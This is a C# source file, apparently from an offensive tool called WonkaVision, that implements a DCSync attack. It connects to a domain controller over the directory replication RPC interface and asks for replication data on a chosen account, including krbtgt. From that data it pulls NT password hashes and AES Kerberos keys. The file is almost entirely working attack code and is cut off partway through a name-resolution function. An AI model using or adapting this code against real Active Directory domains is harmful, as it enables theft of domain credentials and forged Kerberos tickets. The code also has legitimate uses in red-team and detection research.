using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;

namespace WonkaVision.lib
{
    public class DCSync
    {
        #region exectution
        public Dictionary<int, string> Execute(string service, string domain, string server, string credUser = "", string credPass = "", string credDomain = "")
        {
            Dictionary<int, string> output = new Dictionary<int, string>();
            string user = "";
            if (service.Split('/')[0].Equals("krbtgt") && service.Split('/')[1].ToUpper().Equals(domain.ToUpper()))
                user = service.Replace('/', '@').ToLower();
            else if (!service.Split('/')[0].Equals("krbtgt"))
            {
                if (Program.Verbose)
                    Helpers.WriteConsole("[*] Searching LDAP for service user");
                System.Net.NetworkCredential cred = null;
                if (!String.IsNullOrEmpty(credUser) && !String.IsNullOrEmpty(credPass) && !String.IsNullOrEmpty(credDomain))
                    cred = new System.Net.NetworkCredential(credUser, credPass, credDomain);
                List<Dictionary<string, Object>> serviceUser = LDAP.GetLdapQuery(cred, "", server, domain, $"(serviceprincipalname={service})");
                if (serviceUser == null && Enum.IsDefined(typeof(Interop.HostMappedSPNs), service.Split('/')[0]))
                {
                    string newSname = $"(serviceprincipalname=host/{service.Split('/')[1]})";
                    serviceUser = LDAP.GetLdapQuery(cred, "", server, domain, newSname);
                    if (serviceUser != null)
                    {
                        if (!Globals.ServiceNameMapping.ContainsKey((string)(serviceUser[0]["samaccountname"])))
                            Globals.ServiceNameMapping.Add((string)(serviceUser[0]["samaccountname"]), new List<string>());
                        Globals.ServiceNameMapping[(string)(serviceUser[0]["samaccountname"])].Add(newSname.ToLower());
                    }
                }
                else if (serviceUser == null && service.Split('/').Length == 1)
                {
                    serviceUser = LDAP.GetLdapQuery(cred, "", server, domain, $"(samaccountname={service})");
                    if (serviceUser != null)
                    {
                        if (!Globals.ServiceNameMapping.ContainsKey((string)(serviceUser[0]["samaccountname"])))
                            Globals.ServiceNameMapping.Add((string)(serviceUser[0]["samaccountname"]), new List<string>());
                        Globals.ServiceNameMapping[(string)(serviceUser[0]["samaccountname"])].Add(service.ToLower());
                    }
                }
                if (serviceUser == null)
                    return null;
                user = (string)(serviceUser[0]["samaccountname"]);

                if (!Globals.ServiceNameMapping.ContainsKey(user))
                    Globals.ServiceNameMapping.Add(user, new List<string>());
                Globals.ServiceNameMapping[user].Add(service.ToLower());
                if (!Globals.AccountInformation.ContainsKey(domain))
                    Globals.AccountInformation.Add(domain, new Dictionary<string, Dictionary<string, Object>>());
                if (!Globals.AccountInformation[domain].ContainsKey((string)(serviceUser[0]["samaccountname"])))
                    Globals.AccountInformation[domain][(string)(serviceUser[0]["samaccountname"])] = serviceUser[0];
            }

            if (Globals.AccountKeys.ContainsKey(domain) && Globals.AccountKeys[domain].ContainsKey(user))
                return Globals.AccountKeys[domain][user];

            if (!String.IsNullOrEmpty(user))
            {
                Helpers.WriteConsole($"[*] DCSyncing keys for user: {user}");
                DCSync drsr = new DCSync();
                drsr.Initialize(server, domain, credUser, credPass, credDomain);
                List<Dictionary<string, object>> result = drsr.GetData(user);
                foreach (var key in result[0].Keys)
                {
                    if (key.Equals("ATT_UNICODE_PWD"))
                        output[23] = Helpers.ByteArrayToString((byte[])result[0][key]);
                    else if (key.Equals("ATT_SUPPLEMENTAL_CREDENTIALS"))
                    {
                        Interop.USER_PROPERTIES up = (Interop.USER_PROPERTIES)result[0][key];
                        foreach (Interop.USER_PROPERTY prop in up.UserProperties)
                        {
                            if (prop.PropertyName.Equals("Primary:Kerberos-Newer-Keys"))
                            {
                                if (((Interop.KERB_NEWER_KEYS)prop.PropertyValue).CredentialCount > 0)
                                {
                                    foreach (Interop.KERB_NEWER_KEYS_DATA cred in ((Interop.KERB_NEWER_KEYS)prop.PropertyValue).Credentials)
                                    {
                                        if ((Interop.KERB_ETYPE)cred.KeyType == Interop.KERB_ETYPE.aes128_cts_hmac_sha1)
                                            output[17] = Helpers.ByteArrayToString(cred.Key);
                                        else if ((Interop.KERB_ETYPE)cred.KeyType == Interop.KERB_ETYPE.aes256_cts_hmac_sha1)
                                            output[18] = Helpers.ByteArrayToString(cred.Key);
                                    }
                                }
                            }
                        }
                    }
                }
                if (output.Count > 0)
                {
                    if (!Globals.AccountKeys.ContainsKey(domain))
                        Globals.AccountKeys.Add(domain, new Dictionary<string, Dictionary<int, string>>());
                    Globals.AccountKeys[domain].Add(user, output);
                }
            }
            return output;
        }
        #endregion

        #region rpc initialization
        private byte[] MIDL_ProcFormatString;
        private byte[] MIDL_TypeFormatString;
        private GCHandle procString;
        private GCHandle formatString;
        private GCHandle stub;
        private GCHandle faultoffsets;
        private GCHandle clientinterface;
        public UInt32 RPCTimeOut = 1000;
        [StructLayout(LayoutKind.Sequential)]
        private struct COMM_FAULT_OFFSETS
        {
            public short CommOffset;
            public short FaultOffset;
        }
        [StructLayout(LayoutKind.Sequential)]
        private struct GENERIC_BINDING_ROUTINE_PAIR
        {
            public IntPtr Bind;
            public IntPtr Unbind;
        }
        [StructLayout(LayoutKind.Sequential)]
        private struct RPC_VERSION
        {
            public ushort MajorVersion;
            public ushort MinorVersion;
            public RPC_VERSION(ushort InterfaceVersionMajor, ushort InterfaceVersionMinor)
            {
                MajorVersion = InterfaceVersionMajor;
                MinorVersion = InterfaceVersionMinor;
            }
        }
        [StructLayout(LayoutKind.Sequential)]
        private struct RPC_SYNTAX_IDENTIFIER
        {
            public Guid SyntaxGUID;
            public RPC_VERSION SyntaxVersion;
        }
        [StructLayout(LayoutKind.Sequential)]
        private struct RPC_CLIENT_INTERFACE
        {
            public uint Length;
            public RPC_SYNTAX_IDENTIFIER InterfaceId;
            public RPC_SYNTAX_IDENTIFIER TransferSyntax;
            public IntPtr /*PRPC_DISPATCH_TABLE*/ DispatchTable;
            public uint RpcProtseqEndpointCount;
            public IntPtr /*PRPC_PROTSEQ_ENDPOINT*/ RpcProtseqEndpoint;
            public IntPtr Reserved;
            public IntPtr InterpreterInfo;
            public uint Flags;
            public static readonly Guid IID_SYNTAX = new Guid(0x8A885D04u, 0x1CEB, 0x11C9, 0x9F, 0xE8, 0x08, 0x00, 0x2B,
                                                                0x10,
                                                                0x48, 0x60);
            public RPC_CLIENT_INTERFACE(Guid iid, ushort InterfaceVersionMajor, ushort InterfaceVersionMinor)
            {
                Length = (uint)Marshal.SizeOf(typeof(RPC_CLIENT_INTERFACE));
                RPC_VERSION rpcVersion = new RPC_VERSION(InterfaceVersionMajor, InterfaceVersionMinor);
                InterfaceId = new RPC_SYNTAX_IDENTIFIER();
                InterfaceId.SyntaxGUID = iid;
                InterfaceId.SyntaxVersion = rpcVersion;
                rpcVersion = new RPC_VERSION(2, 0);
                TransferSyntax = new RPC_SYNTAX_IDENTIFIER();
                TransferSyntax.SyntaxGUID = IID_SYNTAX;
                TransferSyntax.SyntaxVersion = rpcVersion;
                DispatchTable = IntPtr.Zero;
                RpcProtseqEndpointCount = 0u;
                RpcProtseqEndpoint = IntPtr.Zero;
                Reserved = IntPtr.Zero;
                InterpreterInfo = IntPtr.Zero;
                Flags = 0u;
            }
        }
        [StructLayout(LayoutKind.Sequential)]
        private struct MIDL_STUB_DESC
        {
            public IntPtr /*RPC_CLIENT_INTERFACE*/ RpcInterfaceInformation;
            public IntPtr pfnAllocate;
            public IntPtr pfnFree;
            public IntPtr pAutoBindHandle;
            public IntPtr /*NDR_RUNDOWN*/ apfnNdrRundownRoutines;
            public IntPtr /*GENERIC_BINDING_ROUTINE_PAIR*/ aGenericBindingRoutinePairs;
            public IntPtr /*EXPR_EVAL*/ apfnExprEval;
            public IntPtr /*XMIT_ROUTINE_QUINTUPLE*/ aXmitQuintuple;
            public IntPtr pFormatTypes;
            public int fCheckBounds;
            /* Ndr library version. */
            public uint Version;
            public IntPtr /*MALLOC_FREE_STRUCT*/ pMallocFreeStruct;
            public int MIDLVersion;
            public IntPtr CommFaultOffsets;
            // New fields for version 3.0+
            public IntPtr /*USER_MARSHAL_ROUTINE_QUADRUPLE*/ aUserMarshalQuadruple;
            // Notify routines - added for NT5, MIDL 5.0
            public IntPtr /*NDR_NOTIFY_ROUTINE*/ NotifyRoutineTable;
            public IntPtr mFlags;
            // International support routines - added for 64bit post NT5
            public IntPtr /*NDR_CS_ROUTINES*/ CsRoutineTables;
            public IntPtr ProxyServerInfo;
            public IntPtr /*NDR_EXPR_DESC*/ pExprInfo;
            // Fields up to now present in win2000 release.
            public MIDL_STUB_DESC(IntPtr pFormatTypesPtr, IntPtr RpcInterfaceInformationPtr,
                                    IntPtr pfnAllocatePtr, IntPtr pfnFreePtr, IntPtr aGenericBindingRoutinePairsPtr)
            {
                pFormatTypes = pFormatTypesPtr;
                RpcInterfaceInformation = RpcInterfaceInformationPtr;
                CommFaultOffsets = IntPtr.Zero;
                pfnAllocate = pfnAllocatePtr;
                pfnFree = pfnFreePtr;
                pAutoBindHandle = IntPtr.Zero;
                apfnNdrRundownRoutines = IntPtr.Zero;
                aGenericBindingRoutinePairs = aGenericBindingRoutinePairsPtr;
                apfnExprEval = IntPtr.Zero;
                aXmitQuintuple = IntPtr.Zero;
                fCheckBounds = 1;
                Version = 0x50002u;
                pMallocFreeStruct = IntPtr.Zero;
                MIDLVersion = 0x8000253;
                aUserMarshalQuadruple = IntPtr.Zero;
                NotifyRoutineTable = IntPtr.Zero;
                mFlags = new IntPtr(0x00000001);
                CsRoutineTables = IntPtr.Zero;
                ProxyServerInfo = IntPtr.Zero;
                pExprInfo = IntPtr.Zero;
            }
        }
        private void InitializeStub(Guid interfaceID, byte[] MIDL_ProcFormatString, byte[] MIDL_TypeFormatString, ushort MajorVerson, ushort MinorVersion)
        {
            this.MIDL_ProcFormatString = MIDL_ProcFormatString;
            this.MIDL_TypeFormatString = MIDL_TypeFormatString;
            procString = GCHandle.Alloc(this.MIDL_ProcFormatString, GCHandleType.Pinned);
            RPC_CLIENT_INTERFACE clientinterfaceObject = new RPC_CLIENT_INTERFACE(interfaceID, MajorVerson, MinorVersion);
            COMM_FAULT_OFFSETS commFaultOffset = new COMM_FAULT_OFFSETS();
            commFaultOffset.CommOffset = -1;
            commFaultOffset.FaultOffset = -1;
            faultoffsets = GCHandle.Alloc(commFaultOffset, GCHandleType.Pinned);
            clientinterface = GCHandle.Alloc(clientinterfaceObject, GCHandleType.Pinned);
            formatString = GCHandle.Alloc(MIDL_TypeFormatString, GCHandleType.Pinned);
            MIDL_STUB_DESC stubObject = new MIDL_STUB_DESC(formatString.AddrOfPinnedObject(),
                                                            clientinterface.AddrOfPinnedObject(),
                                                            Marshal.GetFunctionPointerForDelegate((allocmemory)AllocateMemory),
                                                            Marshal.GetFunctionPointerForDelegate((freememory)FreeMemory),
                                                            IntPtr.Zero);
            stub = GCHandle.Alloc(stubObject, GCHandleType.Pinned);
        }
        private void freeStub()
        {
            procString.Free();
            faultoffsets.Free();
            clientinterface.Free();
            formatString.Free();
            stub.Free();
        }
        private static List<IntPtr> TrackedMemoryAllocations;
        delegate IntPtr allocmemory(int size);
        private static IntPtr AllocateMemory(int size)
        {
            IntPtr memory = Marshal.AllocHGlobal(size);
            if (TrackedMemoryAllocations != null)
            {
                TrackedMemoryAllocations.Add(memory);
            }
            return memory;
        }
        delegate void freememory(IntPtr memory);
        private static void FreeMemory(IntPtr memory)
        {
            Marshal.FreeHGlobal(memory);
            if (TrackedMemoryAllocations != null && TrackedMemoryAllocations.Contains(memory))
            {
                TrackedMemoryAllocations.Remove(memory);
            }
        }
        private static void EnableMemoryTracking()
        {
            TrackedMemoryAllocations = new List<IntPtr>();
        }
        private static void FreeTrackedMemoryAndRemoveTracking()
        {
            List<IntPtr> list = TrackedMemoryAllocations;
            TrackedMemoryAllocations = null;
            foreach (IntPtr memory in list)
            {
                Marshal.FreeHGlobal(memory);
            }
        }
        private IntPtr Bind(string server, string credUser = "", string credPass = "", string credDomain = "")
        {
            IntPtr bindingstring = IntPtr.Zero;
            IntPtr binding = IntPtr.Zero;
            IntPtr identityPtr = IntPtr.Zero;
            Int32 status;
            status = Interop.RpcStringBindingCompose(null, "ncacn_ip_tcp", server, null, null, out bindingstring);
            if (status != 0)
                return IntPtr.Zero;
            status = Interop.RpcBindingFromStringBinding(Marshal.PtrToStringUni(bindingstring), out binding);
            Interop.RpcBindingFree(ref bindingstring);
            if (status != 0)
                return IntPtr.Zero;
            Interop.RPC_SECURITY_QOS qos = new Interop.RPC_SECURITY_QOS();
            qos.Version = 1;
            qos.Capabilities = 1;
            GCHandle qoshandle = GCHandle.Alloc(qos, GCHandleType.Pinned);
            Interop.SEC_WINNT_AUTH_IDENTITY identity = new Interop.SEC_WINNT_AUTH_IDENTITY();
            if (!String.IsNullOrEmpty(credUser) && !String.IsNullOrEmpty(credPass) && !String.IsNullOrEmpty(credDomain))
            {
                identity = new Interop.SEC_WINNT_AUTH_IDENTITY(credUser, credDomain, credPass);
                identityPtr = identity.ToPointer();
            }
            status = Interop.RpcBindingSetAuthInfoEx(binding, "ldap/" + server, 6, 9, identityPtr, 0, ref qos);
            qoshandle.Free();
            if (identityPtr != IntPtr.Zero)
            {
                identity.FreePointer(identityPtr);
            }
            if (status != 0)
            {
                Unbind(binding);
                return IntPtr.Zero;
            }
            securityCallbackDelegate = SecurityCallback;
            status = Interop.RpcBindingSetOption(binding, 10, Marshal.GetFunctionPointerForDelegate(securityCallbackDelegate));
            if (status != 0)
            {
                Unbind(binding);
                return IntPtr.Zero;
            }
            status = Interop.RpcBindingSetOption(binding, 12, new IntPtr(RPCTimeOut));
            if (status != 0)
            {
                Unbind(binding);
                return IntPtr.Zero;
            }
            return binding;
        }
        private static void Unbind(IntPtr hBinding)
        {
            Interop.RpcBindingFree(ref hBinding);
        }
        private byte[] SessionKey;
        SecurityCallbackDelegate securityCallbackDelegate;
        private delegate void SecurityCallbackDelegate(IntPtr context);
        private void SecurityCallback(IntPtr context)
        {
            IntPtr SecurityContextHandle;
            Interop.SecPkgContext_SessionKey sessionKey = new Interop.SecPkgContext_SessionKey();
            int res = Interop.I_RpcBindingInqSecurityContext(context, out SecurityContextHandle);
            if (res == 0)
            {
                res = Interop.QueryContextAttributes(SecurityContextHandle, 9, ref sessionKey);
                if (res == 0)
                {
                    SessionKey = new byte[sessionKey.SessionKeyLength];
                    Marshal.Copy(sessionKey.SessionKey, SessionKey, 0, (int)sessionKey.SessionKeyLength);
                }
            }
        }
        private IntPtr GetProcStringHandle(int offset)
        {
            return Marshal.UnsafeAddrOfPinnedArrayElement(MIDL_ProcFormatString, offset);
        }
        private IntPtr GetStubHandle()
        {
            return stub.AddrOfPinnedObject();
        }
        /*private IntPtr CallNdrClientCall2x64(int offset, params IntPtr[] args)
        {
            GCHandle stackhandle = GCHandle.Alloc(args, GCHandleType.Pinned);
            IntPtr result;
            try
            {
                result = Interop.NdrClientCall2x64(GetStubHandle(), GetProcStringHandle(offset), stackhandle.AddrOfPinnedObject());
            }
            finally
            {
                stackhandle.Free();
            }
            return result;
        }*/
        private IntPtr CallNdrClientCall2x86(int offset, params IntPtr[] args)
        {
            GCHandle stackhandle = GCHandle.Alloc(args, GCHandleType.Pinned);
            IntPtr result;
            try
            {
                result = Interop.NdrClientCall2x86(GetStubHandle(), GetProcStringHandle(offset), stackhandle.AddrOfPinnedObject());
            }
            finally
            {
                stackhandle.Free();
            }
            return result;
        }
        #endregion
        #region drsr class and public interfaces
        public DCSync()
        {
            Guid interfaceId = new Guid("e3514235-4b06-11d1-ab04-00c04fc2dcd2");
            if (IntPtr.Size == 8)
            {
                InitializeStub(interfaceId, Interop.MIDL_ProcFormatStringx64, Interop.MIDL_TypeFormatStringx64, 4, 0);
            }
            else
            {
                InitializeStub(interfaceId, Interop.MIDL_ProcFormatStringx86, Interop.MIDL_TypeFormatStringx86, 4, 0);
            }
        }
        ~DCSync()
        {
            freeStub();
            Uninitialize();
        }
        private Guid ntDSAGuid;
        private Interop.DRS_EXTENSIONS_INT extensions;
        private IntPtr hBind;
        public void Initialize(string server, string domain, string credUser = "", string credPass = "", string credDomain = "")
        {
            UInt32 result;
            ntDSAGuid = Guid.Empty;
            extensions = new Interop.DRS_EXTENSIONS_INT();
            IntPtr hDrs = IntPtr.Zero;
            try
            {
                hBind = Bind(server, credUser, credPass, credDomain);
                if (hBind == IntPtr.Zero)
                    throw new Exception("Unable to connect to the server " + server);
                Interop.DRS_EXTENSIONS_INT extensions_int = new Interop.DRS_EXTENSIONS_INT();
                extensions_int.cb = (UInt32)(Marshal.SizeOf(typeof(Interop.DRS_EXTENSIONS_INT)) - Marshal.SizeOf(typeof(UInt32)));
                extensions_int.dwFlags = 0x04000000 | 0x00008000;

                result = DrsBind(hBind, new Guid("e24d201a-4fd6-11d1-a3da-0000f875ae0d"), extensions_int, out extensions, out hDrs);
                if (result != 0)
                    throw new Win32Exception((int)result, "Unable to bind to Drs with generic Guid");
                try
                {
                    result = DrsDomainControllerInfo(hDrs, domain, server, out ntDSAGuid);
                    if (result != 0)
                        throw new Win32Exception((int)result, "Unable to get the NTDSA Guid for the DC " + server);
                }
                finally
                {
                    DrsUnbind(ref hDrs);
                }
            }
            catch (Exception)
            {
                if (hBind != IntPtr.Zero)
                    Unbind(hBind);
                hBind = IntPtr.Zero;
            }
        }
        private void Uninitialize()
        {
            if (hBind != IntPtr.Zero)
                Unbind(hBind);
        }
        public List<Dictionary<string, object>> GetData(string account, string guid = "", bool allData = false)
        {
            UInt32 result;
            Guid userGuid = new Guid();
            List<Dictionary<int, object>> ReplicationData;
            List<Dictionary<string, object>> DecodedReplicationData;
            IntPtr hDrs = IntPtr.Zero;
            Interop.DRS_EXTENSIONS_INT extensions_out;
            if (hBind == IntPtr.Zero)
                throw new Exception("The class has not been initialized");
            result = DrsBind(hBind, ntDSAGuid, extensions, out extensions_out, out hDrs);
            if (result != 0)
            {
                throw new Win32Exception((int)result, "Unable to bind to the DC with the NTDSA guid " + ntDSAGuid);
            }
            try
            {
                if (String.IsNullOrEmpty(guid))
                {
                    result = CrackNameGetGuid(hDrs, account, out userGuid, allData);
                    if (result != 0)
                        throw new Win32Exception((int)result, "Unable to crack the account " + account);
                }
                else
                    userGuid = new Guid(guid);
                result = GetNCChanges(hDrs, ntDSAGuid, userGuid, out ReplicationData, allData);
                if (result != 0)
                    throw new Win32Exception((int)result, "Unable to get the replication changes for " + account);
            }
            finally
            {
                DrsUnbind(ref hDrs);
            }
            DecodeReplicationFields(ReplicationData, out DecodedReplicationData);
            return DecodedReplicationData;
        }
        #endregion
        #region drsr rpc functions and decoding functions
        private UInt32 DrsBind(IntPtr hBinding, Guid NtdsDsaObjectGuid, Interop.DRS_EXTENSIONS_INT extensions_in, out Interop.DRS_EXTENSIONS_INT extensions_out, out IntPtr hDrs)
        {
            IntPtr result = IntPtr.Zero;
            IntPtr pDrsExtensionsExt = IntPtr.Zero;
            hDrs = IntPtr.Zero;
            EnableMemoryTracking();
            try
            {
                if (IntPtr.Size == 8)
                {
                    //result = Interop.NdrClientCall2x64(GetStubHandle(), GetProcStringHandle(0), __arglist(hBinding, NtdsDsaObjectGuid, extensions_in, pDrsExtensionsExt, hDrs));
                    GCHandle handle1 = GCHandle.Alloc(NtdsDsaObjectGuid, GCHandleType.Pinned);
                    IntPtr tempValuePointer1 = handle1.AddrOfPinnedObject();
                    GCHandle handle2 = GCHandle.Alloc(extensions_in, GCHandleType.Pinned);
                    IntPtr tempValuePointer2 = handle2.AddrOfPinnedObject();
                    IntPtr tempValue3 = IntPtr.Zero;
                    GCHandle handle3 = GCHandle.Alloc(tempValue3, GCHandleType.Pinned);
                    IntPtr tempValuePointer3 = handle3.AddrOfPinnedObject();
                    IntPtr tempValue4 = IntPtr.Zero;
                    GCHandle handle4 = GCHandle.Alloc(tempValue4, GCHandleType.Pinned);
                    IntPtr tempValuePointer4 = handle4.AddrOfPinnedObject();
                    try
                    {
                        // each pinvoke work on a copy of the arguments (without an out specifier)
                        // get back the data
                        result = Interop.NdrClientCall2x64(GetStubHandle(), GetProcStringHandle(0), __arglist(hBinding, tempValuePointer1, tempValuePointer2, tempValuePointer3, tempValuePointer4));
                        pDrsExtensionsExt = Marshal.ReadIntPtr(tempValuePointer3);
                        hDrs = Marshal.ReadIntPtr(tempValuePointer4);
                    }
                    catch (Exception ex)
                    {
                        Helpers.WriteConsole($"[!] Exception {ex.Message}");
                    }
                    finally
                    {
                        handle1.Free();
                        handle2.Free();
                        handle3.Free();
                        handle4.Free();
                    }
                }
                else
                {
                    GCHandle handle1 = GCHandle.Alloc(NtdsDsaObjectGuid, GCHandleType.Pinned);
                    IntPtr tempValuePointer1 = handle1.AddrOfPinnedObject();
                    GCHandle handle2 = GCHandle.Alloc(extensions_in, GCHandleType.Pinned);
                    IntPtr tempValuePointer2 = handle2.AddrOfPinnedObject();
                    IntPtr tempValue3 = IntPtr.Zero;
                    GCHandle handle3 = GCHandle.Alloc(tempValue3, GCHandleType.Pinned);
                    IntPtr tempValuePointer3 = handle3.AddrOfPinnedObject();
                    IntPtr tempValue4 = IntPtr.Zero;
                    GCHandle handle4 = GCHandle.Alloc(tempValue4, GCHandleType.Pinned);
                    IntPtr tempValuePointer4 = handle4.AddrOfPinnedObject();
                    try
                    {
                        result = CallNdrClientCall2x86(0, hBinding, tempValuePointer1, tempValuePointer2, tempValuePointer3, tempValuePointer4);
                        // each pinvoke work on a copy of the arguments (without an out specifier)
                        // get back the data
                        pDrsExtensionsExt = Marshal.ReadIntPtr(tempValuePointer3);
                        hDrs = Marshal.ReadIntPtr(tempValuePointer4);
                    }
                    catch (Exception ex)
                    {
                        Helpers.WriteConsole($"[!] Exception {ex.Message}");
                    }
                    finally
                    {
                        handle1.Free();
                        handle2.Free();
                        handle3.Free();
                        handle4.Free();
                    }
                }
                extensions_out = extensions_in;
                Interop.DRS_EXTENSIONS_INT extensions_out_temp = (Interop.DRS_EXTENSIONS_INT)Marshal.PtrToStructure(pDrsExtensionsExt, typeof(Interop.DRS_EXTENSIONS_INT));
                if (extensions_out_temp.cb > Marshal.OffsetOf(typeof(Interop.DRS_EXTENSIONS_INT), "SiteObjGuid").ToInt32())
                {
                    extensions_out.SiteObjGuid = extensions_out_temp.SiteObjGuid;
                    if (extensions_out_temp.cb > Marshal.OffsetOf(typeof(Interop.DRS_EXTENSIONS_INT), "dwReplEpoch").ToInt32())
                    {
                        extensions_out.dwReplEpoch = extensions_out_temp.dwReplEpoch;
                        if (extensions_out_temp.cb > Marshal.OffsetOf(typeof(Interop.DRS_EXTENSIONS_INT), "dwFlagsExt").ToInt32())
                        {
                            extensions_out.dwFlagsExt = extensions_out_temp.dwFlagsExt & 4;
                            if (extensions_out_temp.cb > Marshal.OffsetOf(typeof(Interop.DRS_EXTENSIONS_INT), "ConfigObjGUID").ToInt32())
                            {
                                extensions_out.ConfigObjGUID = extensions_out_temp.ConfigObjGUID;
                            }
                        }
                    }
                }
            }
            catch (SEHException)
            {
                extensions_out = new Interop.DRS_EXTENSIONS_INT();
                int ex = Marshal.GetExceptionCode();
                return (UInt32)ex;
            }
            finally
            {
                FreeTrackedMemoryAndRemoveTracking();
            }
            return (UInt32)result.ToInt64();
        }
        private UInt32 DrsUnbind(ref IntPtr hDrs)
        {
            IntPtr result = IntPtr.Zero;
            try
            {
                if (IntPtr.Size == 8)
                {
                    result = Interop.NdrClientCall2x64(GetStubHandle(), GetProcStringHandle(60), __arglist(ref hDrs));
                }
                else
                {
                    GCHandle handle1 = GCHandle.Alloc(hDrs, GCHandleType.Pinned);
                    IntPtr tempValuePointer1 = handle1.AddrOfPinnedObject();
                    try
                    {
                        result = CallNdrClientCall2x86(58, tempValuePointer1);
                        // each pinvoke work on a copy of the arguments (without an out specifier)
                        // get back the data
                        hDrs = Marshal.ReadIntPtr(tempValuePointer1);
                    }
                    finally
                    {
                        handle1.Free();
                    }
                }
            }
            catch (SEHException)
            {
                int ex = Marshal.GetExceptionCode();
                return (UInt32)ex;
            }
            finally
            {
            }
            return (UInt32)result.ToInt64();
        }
        private UInt32 DrsDomainControllerInfo(IntPtr hDrs, string domain, string serverName, out Guid NtdsDsaObjectGuid)
        {
            IntPtr result = IntPtr.Zero;
            Interop.DRS_MSG_DCINFOREQ_V1 dcInfoReq = new Interop.DRS_MSG_DCINFOREQ_V1();
            dcInfoReq.InfoLevel = 2;
            dcInfoReq.Domain = Marshal.StringToHGlobalUni(domain);
            UInt32 dcOutVersion = 0;
            UInt32 dcInVersion = 1;
            Interop.DRS_MSG_DCINFOREPLY_V2 dcInfoRep = new Interop.DRS_MSG_DCINFOREPLY_V2();
            EnableMemoryTracking();
            try
            {
                if (IntPtr.Size == 8)
                {
                    //result = Interop.NdrClientCall2x64(GetStubHandle(), GetProcStringHandle(600), __arglist(hDrs, dcInVersion, dcInfoReq, dcOutVersion, ref dcInfoRep));
                    GCHandle handle1 = GCHandle.Alloc(dcInfoReq, GCHandleType.Pinned);
                    IntPtr tempValuePointer1 = handle1.AddrOfPinnedObject();
                    IntPtr tempValue2 = IntPtr.Zero;
                    GCHandle handle2 = GCHandle.Alloc(tempValue2, GCHandleType.Pinned);
                    IntPtr tempValuePointer2 = handle2.AddrOfPinnedObject();
                    GCHandle handle3 = GCHandle.Alloc(dcInfoRep, GCHandleType.Pinned);
                    IntPtr tempValuePointer3 = handle3.AddrOfPinnedObject();
                    try
                    {
                        result = Interop.NdrClientCall2x64(GetStubHandle(), GetProcStringHandle(600), __arglist(hDrs, new IntPtr(dcInVersion), tempValuePointer1, tempValuePointer2, tempValuePointer3));
                        // each pinvoke work on a copy of the arguments (without an out specifier)
                        // get back the data
                        dcOutVersion = (UInt32)Marshal.ReadInt32(tempValuePointer2);
                        dcInfoRep = (Interop.DRS_MSG_DCINFOREPLY_V2)Marshal.PtrToStructure(tempValuePointer3, typeof(Interop.DRS_MSG_DCINFOREPLY_V2));
                    }
                    finally
                    {
                        handle1.Free();
                        handle2.Free();
                        handle3.Free();
                    }
                }
                else
                {
                    GCHandle handle1 = GCHandle.Alloc(dcInfoReq, GCHandleType.Pinned);
                    IntPtr tempValuePointer1 = handle1.AddrOfPinnedObject();
                    IntPtr tempValue2 = IntPtr.Zero;
                    GCHandle handle2 = GCHandle.Alloc(tempValue2, GCHandleType.Pinned);
                    IntPtr tempValuePointer2 = handle2.AddrOfPinnedObject();
                    GCHandle handle3 = GCHandle.Alloc(dcInfoRep, GCHandleType.Pinned);
                    IntPtr tempValuePointer3 = handle3.AddrOfPinnedObject();
                    try
                    {
                        result = CallNdrClientCall2x86(568, hDrs, new IntPtr(dcInVersion), tempValuePointer1, tempValuePointer2, tempValuePointer3);
                        // each pinvoke work on a copy of the arguments (without an out specifier)
                        // get back the data
                        dcOutVersion = (UInt32)Marshal.ReadInt32(tempValuePointer2);
                        dcInfoRep = (Interop.DRS_MSG_DCINFOREPLY_V2)Marshal.PtrToStructure(tempValuePointer3, typeof(Interop.DRS_MSG_DCINFOREPLY_V2));
                    }
                    finally
                    {
                        handle1.Free();
                        handle2.Free();
                        handle3.Free();
                    }
                }
                NtdsDsaObjectGuid = GetDsaGuid(dcInfoRep, serverName);
            }
            catch (SEHException)
            {
                NtdsDsaObjectGuid = Guid.Empty;
                int ex = Marshal.GetExceptionCode();
                return (UInt32)ex;
            }
            finally
            {
                Marshal.FreeHGlobal(dcInfoReq.Domain);
                FreeTrackedMemoryAndRemoveTracking();
            }
            return (UInt32)result.ToInt64();
        }
        private Guid GetDsaGuid(Interop.DRS_MSG_DCINFOREPLY_V2 dcInfoRep, string server)
        {
            Guid OutGuid = Guid.Empty;
            int size = Marshal.SizeOf(typeof(Interop.DS_DOMAIN_CONTROLLER_INFO_2W));
            for (uint i = 0; i < dcInfoRep.cItems; i++)
            {
                Interop.DS_DOMAIN_CONTROLLER_INFO_2W info = (Interop.DS_DOMAIN_CONTROLLER_INFO_2W)Marshal.PtrToStructure(new IntPtr(dcInfoRep.rItems.ToInt64() + i * size), typeof(Interop.DS_DOMAIN_CONTROLLER_INFO_2W));
                string infoDomain = Marshal.PtrToStringUni(info.DnsHostName);
                string infoNetbios = Marshal.PtrToStringUni(info.NetbiosName);
                if (server.StartsWith(infoDomain, StringComparison.InvariantCultureIgnoreCase) || server.StartsWith(infoNetbios, StringComparison.InvariantCultureIgnoreCase))
                {
                    OutGuid = info.NtdsDsaObjectGuid;
                }
            }
            return OutGuid;
        }
        private UInt32 CrackNameGetGuid(IntPtr hDrs, string Name, out Guid userGuid, bool allData = false)
        {
            IntPtr result = IntPtr.Zero;
            userGuid = Guid.Empty;
            Interop.DRS_MSG_CRACKREQ_V1 dcInfoReq = new Interop.DRS_MSG_CRACKREQ_V1();
            if (Name.Contains("\\"))
                dcInfoReq.formatOffered = 2;
            else if (Name.Contains("="))
                dcInfoReq.formatOffered = 1;
            else if (Name.Contains("@"))
                dcInfoReq.formatOffered = 8;
            else if (allData)
                dcInfoReq.formatOffered = 11;
            else
                dcInfoReq.formatOffered = 0xfffffff9;
            dcInfoReq.formatDesired = 6;
            dcInfoReq.cNames = 1;
            IntPtr NameIntPtr = Marshal.StringToHGlobalUni(Name);
            GCHandle handle = GCHandle.Alloc(NameIntPtr, GCHandleType.Pinned);
            dcInfoReq.rpNames = handle.AddrOfPinnedObject();
            IntPtr dcInfoRep = IntPtr.Zero;
            UInt32 dcInVersion = 1;
            UInt32 dcOutVersion = 0;
            EnableMemoryTracking();
            try
            {
                if (IntPtr.Size == 8)
                {
                    //result = Interop.NdrClientCall2x64(GetStubHandle(), GetProcStringHandle(442), __arglist(hDrs, dcInVersion, dcInfoReq, dcOutVersion, ref dcInfoRep));
                    GCHandle handle1 = GCHandle.Alloc(dcInfoReq, GCHandleType.Pinned);
                    IntPtr tempValuePointer1 = handle1.AddrOfPinnedObject();
                    IntPtr tempValue2 = IntPtr.Zero;
